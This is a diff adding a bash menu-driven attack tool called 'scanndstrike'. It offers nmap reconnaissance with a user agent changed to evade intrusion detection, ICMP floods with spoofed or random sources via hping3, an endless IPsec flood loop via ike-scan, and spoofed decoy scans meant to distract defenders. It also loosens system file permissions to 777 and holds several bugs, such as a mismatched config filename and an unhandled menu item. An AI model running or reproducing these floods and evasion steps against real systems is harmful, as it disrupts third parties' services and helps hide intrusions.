@@ -1,0 +1,333 @@
+#!/bin/bash
+
+PS3="scannstrike>" #prompt used to identify the program and tell the user they aren't running a bash script
+
+#Create the ScanndStrike Menu
+#Launch the start/main menu
+homemenu()
+{
+#create a menu for the program using bash select, create sub menus within that can be used to run various modules
+homemenu=("Perform Recon" "Execute Denial of Service Attacks" "Execute Attacks on Smart Devices "  "Exit") #creates the sub menu and the output shown to the user
+select opt in "${homemenu[@]}"; do
+        if [ "$opt" = "Exit" ]; then
+        echo "Quitting...Thank you for using scanndstrike!" && sleep 1 && clear
+        exit 0
+        elif [ "$opt" = "Perform Recon" ]; then
+netreconmenu
+        elif [ "$opt" = "Execute Denial of Service Attacks" ]; then
+dosattackmenu
+        else
+#if no valid option is chosen, chastise the user
+        echo "To exit this tool hit Return/Enter! Thank you"
+        fi
+done
+}
+#End of HomeMenu Code
+
+#################
+# Sub Menu Code #
+#################
+
+
+#Start of the NetRecon Menu Code
+netreconmenu()
+{
+#build a menu for the recon modules using bash select
+                netreconmenu=("Show IP" "Quick Scan" "Detailed Scan" "DNS Recon" "Ping Sweep" "Go back")
+        select reconopt in "${netreconmenu[@]}"; do
+
+#Display  users external IP & interface IP(s)
+        if [ "$reconopt" = "Show IP" ]; then
+                showip
+
+#Perform Quick Recon on the Network
+    elif [ "$reconopt" = "Quick Scan" ]; then
+        quickscan
+
+#Perform a stealthy scan on the Network
+    elif [ "$reconopt" = "Detailed Scan" ]; then
+        detailedscan
+
+#DNS Recon
+    elif [ "$reconopt" = "DNS Recon" ]; then
+        dnsrecon
+#Ping Sweep
+    elif [ "$reconopt" = "Ping Sweep" ]; then
+        pingsweep
+#Go back
+        elif [ "$reconopt" = "Go back" ]; then
+                homemenu
+## Default if no menu option selected is to return an error
+        else
+                echo  "That's not a valid option! Hit Return to show menu"
+        fi
+        done
+}
+#End of the NetRecon Menu Code
+
+###########################################
+# Start of the Net Recon Menu Module Code #
+###########################################
+
+#Start of the ShowIP Code
+showip()
+{               echo "Curl is used to externally lookup the IP address"
+                echo "The IP was externally detected as:"
+#Lookup external IP using curl
+                curl https://icanhazip.com/s/
+                echo ""
+                echo ""
+#show interface IP's
+                echo "Interface IP's are:"
+                ip a|grep inet
+#Revert to ifconfig command if the ip -a command fails
+        if ! [[ $? = 0 ]]; then
+                ifconfig|grep inet
+        fi
+                echo ""
+}
+#End of the ShowIP Code
+
+#Start of the Quick Scan Code
+quickscan()
+{ echo "This module was designed to conducts a scan of an entire network using nmap to search for common open ports"
+echo "A TCP SYN will be used to perform a scan of the 1000 most common ports"
+echo "The duration of this scan may vary depending on the target chosen"
+echo "Please enter the target subnet range or hostname:"
+#While it is possible to scan a hostname, this module was designed for subnet range scanning
+read -i $TARGET -e TARGET
+echo "Enter the speed of scan (0 means very slow and 5 means fast).
+Slower scans are more subtle, but faster means less waiting around.
+Default is 3:"
+#How should the scan speed be decided? 
+#Well the faster the scan is, the stronger the liklihood of the scan being detected by the IDS (Intrustion Detection System)
+#However a slow scan means waiting a longer time period for results therefore the default scan speed would be 3.
+read -i $SPEED -e SPEED
+: ${SPEED:=3}
+#Initiate the scan
+sudo nmap -Pn -sS -T $SPEED $TARGET --reason
+}
+#End of the Quick Scan Code
+
+#Start of the Detailed Scan code
+detailedscan()
+{ echo "This module implements the use of nmap to perform scans"
+echo "While this module was created to perform a detailed scan of a specific target host it can also be used against an entire network"
+echo "The nmap command used means that ALL ports on the target host are scanned and nmap attempts to detect the OS (Operating System) and service information"
+echo "Due to the nature of this scan it may take a few minutes to complete so please have patience ! Perhaps make a coffee while you wait !"
+echo "Please enter the IP address or name of the host you wish to scan"
+#requires a target IP address/hostname
+read -i $TARGET -e TARGET
+echo "Enter the speed of scan (0 means very slow and 5 means fast).
+Slower scans are more subtle, but faster means less waiting around.
+Default is 3:"
+#How should the scan speed be decided? 
+#Well the faster the scan is, the stronger the liklihood of the scan being detected by the IDS (Intrustion Detection System)
+#However a slow scan means waiting a longer time period for results therefore the default scan speed would be 3.
+read -i $SPEED -e SPEED
+: ${SPEED:=3}
+#THe scan is performed using nmap and the user agent is changed from nmaps default to decrease the risk of detection.
+sudo nmap -script-args http.useragent="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36  Chrome/79.0.3945.74 Safari/537.36 Edg/79.0.309.43" -Pn -p 1-65535 -sV -sC -A -O -T $SPEED $TARGET --reason
+}
+#End of Detailed Scan Code
+
+#Start of the DNS Recon Code
+dnsrecon()
+{ echo "This module executes passive recon commands through reverse and forward name searches (or lookups) for the target and performs a whois lookup"
+        echo "Enter target:"
+#need a target IP/hostname to check
+        read -i $TARGET -e TARGET
+host $TARGET
+#Try the nslookup command if the host command is unresponsive
+if ! [[ $? = 0 ]]; then
+nslookup $TARGET
+fi
+#On the target run a whois search
+sleep 1 && whois -H $TARGET
+if ! [[ $? = 0 ]]; then
+#Perform a curl look up of ip.info.io if the whois command fails
+sleep 1 && curl ipinfo.io/$TARGET
+fi
+}
+#End of DNS Recon Code
+
+
+#Start of the Ping Sweep Code
+pingsweep()
+{ echo "This module performs a simple ICMP 'ping' sweep"
+        echo "Please enter the target. Example  192.168.0.1/24):"
+#The subnet is required to scan for all live hosts with pings
+        read -i $TARGET -e TARGET
+#Use nmap to initiate the pingsweep command
+#While the ping command could be used here instead of nmap, bash can sometimes have issues with this command when subnets are involved therefore nmap is the better choice
+sudo nmap -sP -PE $TARGET --reason
+}
+#End of the Ping Sweep Code
+
+
+
+##############################################
+#End of Network Recon Menu and Functions Code#
+##############################################
+
+
+#################################
+#Start of DOS Menu and Functions#
+#################################
+
+#Start of DoS Menu Code
+dosattackmenu()
+{
+#display a menu for the DOS module using bash select
+                dosattackmenu=("ICMP Flood"  "IPSEC Dos"  "Distraction Scan"  "Main Menu")
+        select dosopt in "${dosattackmenu[@]}"; do
+#ICMP Flood
+        if [ "$dosopt" = "ICMP Flood" ]; then
+                icmpflood
+#IPsec  DOS
+        elif [ "$dosopt" = "IPSEC Dos" ]; then
+                ipsecdos
+#Distraction scan
+        elif [ "$dosopt" = "Distraction Scan" ]; then
+                distractionscan
+#Menu
+        elif [ "$dosopt" = "Main Menu" ]; then
+                homemenu
+        else
+#If no valid menu option selected an error is returned
+        echo  "That's not a valid option! Hit Return/Enter to show menu"
+        fi
+done
+}
+#End of DoS Attack Menu Code
+
+####################################
+# Functions of the DoS Attack Menu #
+####################################
+
+#Start of ICMPFLOOD Code                                                                                                                                                                                                            2 ⨯
+icmpflood()
+{
+                echo "ICMP Flood launched using hping3"
+                echo "Please enter a target hostname or IP address:"
+#IP address/hostname of the target is required to begin
+                read -i $TARGET -e TARGET
+#Define whether the user wasnts to use a random, manual or outgoing interface IP
+                echo "Enter Source IP, or [r]andom or [i]nterface IP (default):"
+        read -i $SOURCE -e SOURCE
+        : ${SOURCE:=i}
+        if [[ "$SOURCE" =~ ^([0-9]{1,3})[.]([0-9]{1,3})[.]([0-9]{1,3})[.]([0-9]{1,3})$ ]]; then
+                echo "Starting ICMP echo Flood. Use 'Ctrl c' to end and return to menu"
+                sudo hping3 -1 --flood --spoof $SOURCE $TARGET
+        elif [ "$SOURCE" = "r" ]; then
+                echo "Starting ICMP Echo Flood. Use 'Ctrl c' to end and return to menu"
+                sudo hping3 -1 --flood --rand-source $TARGET
+        elif [ "$SOURCE" = "i" ]; then
+                echo "Starting ICMP Echo Flood. Use 'Ctrl c' to end and return to menu"
+                sudo hping3 -1 --flood $TARGET
+        else echo "Not a valid option!  Using interface IP"
+                echo "Starting ICMP Echo Flood. Use 'Ctrl c' to end and return to menu"
+                sudo hping3 -1 --flood $TARGET
+        fi
+}
+#End of IMPCFLOOD code
+
+
+#Start of IPsec DoS Code
+ipsecdos()
+{ echo "This module will attempt to spoof an IPsec server, with a spoofed source address"
+echo "Enter target IP or hostname:"
+read -i $TARGET -e TARGET
+#By default launch the Denial of Service Attack with a random source address
+echo "IPsec Denial of Service running now.. to stop the DoS Attack use the 'Ctrl' + 'c' keys together" &&
+while :
+do sudo ike-scan -A -B 100M -t 1 --sourceip=random $TARGET 1>/dev/null; sudo ike-scan -B 100M -t 1 -q --sourceip=random $TARGET 1>/dev/null
+done
+}
+#End of the IPSEC DoS Code
+
+
+#Start of Distraction Scan Code
+distractionscan()
+{ echo "This module will send a TCP SYN scan with a spoofed source address"
+echo "This module is designed to be obvious, to distract your target from any real scan or other activity you may actually be performing"
+echo "Enter target:"
+#require a  target IP/hostname
+read -i $TARGET -e TARGET
+echo "PLease enter spoofed source address:"
+#require a spoofed source address
+read -i $SOURCE -e SOURCE
+#use hping to perform multiple obvious scans we wish to get caught by the target
+for i in {1..50}; do echo "sending scan $i" && sudo hping3 --scan all --spoof $SOURCE -S $TARGET 2>/dev/null 1>/dev/null; done
+exit 0
+}
+#End of Distraction Scan Code
+
+
+#######
+#End of DoS Attack Menu and Functionality
+#######
+
+#Required Proxy
+#Implement Stunnel proxy on host device
+stunnel_client()
+{ echo "use SSL/TLS? [y]es or [n]o (default):"
+        read SSL
+        : ${SSL:=n}
+#Create an SSL/TLS tunnel using a local listener on TCP port 9991
+if [[ "$SSL" = "y" ]]
+        then echo "Using SSL/TLS"
+LHOST=127.0.0.1
+LPORT=9991
+#Determine if stunnel has been definined in the /etc/services directory and if it hasn't been then add it and set the required permissions
+grep -q $LPORT /etc/services
+if [[ $? = 1 ]]
+then
+echo "Adding scanndstrike stunnel service to /etc/services" && sudo chmod 777 /etc/services && sudo echo "scanndstrike-stunnel-client 9991/tcp #pentmenu stunnel client listener" >> /etc/services &&  sudo chmod 644 /etc/services
+fi
+#Show network listening ports if ss function is availible for use
+if test -f "/bin/ss"; then
+        LISTPORT=ss;
+#otherwise use netstat
+        else LISTPORT=netstat
+fi
+#Check for port 9991 & display listening ports
+$LISTPORT -tln |grep -q $LPORT
+if [[ "$?" = "1" ]]
+#Perform stunnel configuration on port 9991 if it is not currently running a form of SSL
+
+then
+        echo "Creating stunnel client on $LHOST:$LPORT"
+                sudo rm -f /etc/stunnel/scanndstrike.conf;
+                sudo touch /etc/stunnel/scanndstrike.conf && sudo chmod 777 /etc/stunnel/scanndstrike.conf
+                sudo echo "[SCANNDSTRIKE-CLIENT]" >> /etc/stunnel/scanndstrike.conf
+                sudo echo "client=yes" >> /etc/stunnel/pentmenu.conf
+                sudo echo "accept=$LHOST:$LPORT" >> /etc/stunnel/scanndstrike.conf
+                sudo echo "connect=$TARGET:$PORT" >> /etc/stunnel/scanndstrike.conf
+                sudo echo "verify=0" >> /etc/stunnel/scanndstrike.conf
+                sudo chmod 644 /etc/stunnel/scanndstrike.conf
+                sudo stunnel /etc/stunnel/scanndstrike.conf && sleep 1
+
+# If the user already as a stunnel listener active we do not need to execute this function
+else echo "It appears the stunnel is already being used to listen on port 9991, action not required."
+fi
+fi }
+#End of Proxy Server code
+
+##WELCOME##
+#########################
+#Display opening message 
+#since all the code above is being used to create functions (which must be defined before use) the opening message must be written as the last part of the script
+#This is to avoid any functionality issues and makes for a cleaner script
+
+        clear && echo ""
+
+echo "Welcome to scanndstrike!"
+echo "Please report all bugs, improvements and suggestions to the Repository where you found this software"
+echo "This software is only for responsible, authorised use."
+echo "YOU are responsible for your own actions!"
+echo ""
+echo "" 
+homemenu
+##End Opening Message
+
